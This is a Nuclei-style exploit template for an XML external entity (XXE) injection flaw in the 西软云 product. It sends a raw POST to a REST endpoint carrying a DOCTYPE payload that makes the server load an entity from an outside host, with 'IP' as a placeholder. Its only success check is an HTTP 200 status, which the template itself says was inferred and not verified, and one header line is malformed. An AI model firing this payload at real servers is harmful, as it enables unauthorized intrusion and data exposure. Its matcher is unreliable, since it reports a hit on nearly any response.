id: poc-dm7lthysvqye2awr
info:
  name: 西软云 XML 实体注入漏洞（XXE）漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: xxe,2024
http:
- raw:
  - 'POST /ItfServerRS/rest/ideas/getresponseasync HTTP/1.1

    Host: {{Hostname}}

    Cache-Control: max-age=0Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36

    Content-Type: application/x-www-form-urlencoded


    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "IP"> %remote;]>'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
